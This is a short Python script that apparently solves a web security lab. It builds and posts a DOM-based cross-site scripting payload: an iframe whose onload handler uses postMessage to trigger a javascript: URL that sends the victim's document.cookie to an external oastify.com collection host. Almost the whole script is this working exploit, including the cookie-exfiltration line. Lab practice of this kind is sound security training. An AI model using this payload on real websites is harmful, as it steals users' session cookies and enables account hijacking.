import sys
import logging
import argparse
import urllib3

import requests

from utils import utils   # script written by @tjc_  https://youtu.be/E6wN2zBpdKk
from utils.shop import Shop


log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url, args.no_proxy)
    # escape single or double quotes  \'  \"  
    payload = (
        f'<iframe src="{shop.base_url}" onload=\'this.contentWindow.postMessage('
        '"{"type":"load-channel","url":"JavaScript:document.location=\'https://v2ykbhmn0gw4ccjdwrgqgtu61x7ovej3.oastify.com?c=\'+document.cookie"}","*")\'></iframe>'
    )
    shop.post_exploit(response_body=payload)
    shop.is_solved()


if __name__ == "__main__":          # credit for this code go to @tjc_  \o/  u r a legend !
    args = utils.parse_args(sys.argv)
    main(args)
